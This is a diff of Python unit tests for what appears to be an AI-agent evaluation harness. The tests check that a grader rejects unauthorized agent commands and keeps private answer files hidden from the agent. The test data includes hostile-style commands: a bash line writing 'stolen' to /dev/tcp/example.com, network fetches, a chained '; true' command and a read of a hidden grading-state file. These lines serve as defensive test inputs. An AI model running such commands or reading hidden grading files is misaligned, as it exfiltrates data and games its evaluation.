@@ -155,6 +155,35 @@ class GhOfflineTests(unittest.TestCase):
         self.assertTrue(any("pull_request" in item for item in items))
         self.assertEqual(gh.replay_case(entry)["custom_metrics"]["gh_gate"], 1)
 
+    def test_authorization_rejects_unmodeled_completed_calls(self):
+        entry = gh.dataset(selected=["gh-001"])[0]
+        for command in (
+            "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://example.com\")'",
+            "node -e 'fetch(\"https://example.com\")'",
+            "bash -c 'echo stolen > /dev/tcp/example.com/80'",
+            "gh issue view 12 --repo fixture-org/widget --json title,comments; true",
+            "cat /opt/gh-eval/state/case.json",
+            "env gh issue view 12 --repo fixture-org/widget --json title,comments",
+        ):
+            with self.subTest(command=command):
+                call = {"action": "exec_command", "action_input": {"cmd": command}, "observation": "completed"}
+                reward = gh.replay_case(entry, extra_calls=[call])
+                self.assertEqual(reward["custom_metrics"]["gh_authorization"], 0)
+        for call in (
+            {"action": "unknown", "action_input": {}, "observation": "completed"},
+            {"action": "exec_command", "action_input": {"cmd": "git status --porcelain"}},
+            {"action": "exec_command", "action_input": {"cmd": "git status --porcelain"}, "observation": "", "normalization_status": "unobserved_inner_call"},
+        ):
+            self.assertEqual(gh.replay_case(entry, extra_calls=[call])["custom_metrics"]["gh_authorization"], 0)
+
+    def test_authorization_accepts_public_reads_and_literal_json_result_write(self):
+        import shlex
+
+        entry = gh.dataset(selected=["gh-001"])[0]
+        commands = ["cat AGENTS.md", "pwd", "ls -la", "printf '%s\\n' " + shlex.quote(json.dumps(entry["contract"]["expected"])) + " > output/result.json"]
+        calls = [{"action": "exec_command", "action_input": {"cmd": command}, "observation": ""} for command in commands]
+        self.assertEqual(gh.replay_case(entry, extra_calls=calls)["custom_metrics"]["gh_gate"], 1)
+
     def test_preinstall_selection_needs_only_python_standard_library(self):
         result = subprocess.run(
             [
@@ -287,25 +316,29 @@ class GhOfflineTests(unittest.TestCase):
 )
 class GhNativeTests(unittest.TestCase):
     def test_native_task_generation_both_arms_and_hidden_verifier_contract(self):
-        from skillevaluator.tier3.harbor.adapter import generate_harbor_tasks
+        from skillevaluator.tier3.harbor.adapter import stage_native_harbor_tasks
 
         with tempfile.TemporaryDirectory(prefix="gh-native-") as tmp:
             root = Path(tmp)
             skill = gh.stage(gh.ROOT, root / "bundle/gh", list(gh.SMOKE))
             arms = []
             for with_skill in (True, False):
-                tasks = generate_harbor_tasks(
+                tasks = stage_native_harbor_tasks(
                     skill,
                     root / str(with_skill),
                     with_skill=with_skill,
                     grading_mode="default_plus_custom",
-                    pre_agent_setup=[gh.SETUP],
                     workspace_mode="group",
                     workspace_skill_paths=[skill.parent / gh.COMPETING],
                 )
                 self.assertEqual(len(tasks), 4)
                 arms.append(tasks)
                 for task in tasks:
+                    import tomllib
+                    config = tomllib.loads((task / "task.toml").read_text())
+                    self.assertEqual(config["agent"]["user"], "agent")
+                    self.assertEqual(config["verifier"]["user"], "root")
+                    self.assertTrue((task / "environment/private/cases" / (task.name + ".json")).is_file())
                     self.assertTrue((task / "tests/grader.py").is_file())
                     visible_skills = {
                         p.parent.name for p in (task / "environment").rglob("SKILL.md")
@@ -324,6 +357,7 @@ class GhNativeTests(unittest.TestCase):
                         for p in (task / "environment/input").rglob("*")
                         if p.is_file()
                     )
+                    self.assertFalse((task / "environment/input/cases").exists())
                     self.assertNotIn("good_commands", visible)
                     self.assertNotIn("required_routes", visible)
             for left, right in zip(*arms):
@@ -343,20 +377,25 @@ class GhNativeTests(unittest.TestCase):
                         )
 
     def test_production_grader_uses_native_completed_calls_and_propagates_failure(self):
-        from skillevaluator.tier3.harbor.adapter import generate_harbor_tasks
+        from skillevaluator.tier3.harbor.adapter import stage_native_harbor_tasks
         import shlex
 
         with tempfile.TemporaryDirectory(prefix="gh-grading-") as temporary:
             root = Path(temporary)
             skill = gh.stage(gh.ROOT, root / "bundle/gh", ["gh-001"])
-            task = generate_harbor_tasks(
+            task = stage_native_harbor_tasks(
                 skill, root / "tasks", grading_mode="default_plus_custom"
             )[0]
             workspace = root / "workspace"
             workspace.mkdir()
-            shutil.copytree(task / "environment/input", workspace / "input")
+            shutil.copytree(task / "environment/private", workspace / "input")
+            shutil.copytree(task / "environment/skills", workspace / "skills")
             setup = gh.module(gh.ROOT / gh.OVERLAY / "evals/files/setup.py", "setup")
             environment = setup.setup(workspace, workspace / "input")
+            broker = setup.start_broker(workspace / ".gh-fixture", workspace / "broker/gh.sock")
+            self.addCleanup(broker.wait, timeout=5)
+            self.addCleanup(broker.terminate)
+            environment["GH_FIXTURE_SOCKET"] = str(workspace / "broker/gh.sock")
             original = gh.dataset(selected=["gh-001"])[0]
             args = original["contract"]["good_commands"][0]
             result = subprocess.run(
@@ -498,7 +537,7 @@ class GhNativeTests(unittest.TestCase):
     def test_native_strict_dataset_and_custom_reward_propagation(self):
         from click.testing import CliRunner
         from skillevaluator.cli import cli
-        from skillevaluator.tier3.harbor.adapter import generate_harbor_tasks
+        from skillevaluator.tier3.harbor.adapter import stage_native_harbor_tasks
 
         with tempfile.TemporaryDirectory(prefix="gh-grader-") as tmp:
             root = Path(tmp)
@@ -507,7 +546,7 @@ class GhNativeTests(unittest.TestCase):
                 cli, ["tier3", "validate", str(skill), "--strict", "--json"]
             )
             self.assertEqual(result.exit_code, 0, result.output)
-            task = generate_harbor_tasks(
+            task = stage_native_harbor_tasks(
                 skill, root / "tasks", grading_mode="default_plus_custom"
             )[0]
             runner = task / "tests/custom_grader_runner.py"
